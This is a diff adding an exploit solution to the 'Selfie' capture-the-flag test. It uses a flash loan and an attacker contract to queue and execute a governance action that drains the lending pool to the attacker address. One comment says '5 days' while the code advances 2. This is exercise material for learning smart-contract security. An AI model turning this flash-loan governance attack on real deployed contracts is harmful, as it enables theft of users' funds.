@@ -31,6 +31,18 @@ describe('[Challenge] Selfie', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        //So the idea is to take a flashloan and queue an action to drain all the funds to the attacker address, will deploy
+        //an attacker contract to pass the flashloan's checks.
+        //The problem I ran into was that I needed to create a snapshot in the moment of receiving the funds. After
+        //that it was easy to call the governance contract and queue the action to finally execute it 2 days after
+        const dataForAction = this.pool.interface.encodeFunctionData("drainAllFunds(address)", [attacker.address]);
+        const AttackSimpleGovernanceFactory = await ethers.getContractFactory('AttackSimpleGovernance', attacker);
+        let attackerContract = await AttackSimpleGovernanceFactory.deploy(this.governance.address, this.pool.address, this.token.address);
+        await attackerContract.attack(dataForAction, TOKENS_IN_POOL);
+        let id = await attackerContract.actionIdAttacked();
+        let attackGovernanceInstance = await this.governance.connect(attacker);
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 5 days
+        await attackGovernanceInstance.executeAction(id);
     });
 
     after(async function () {
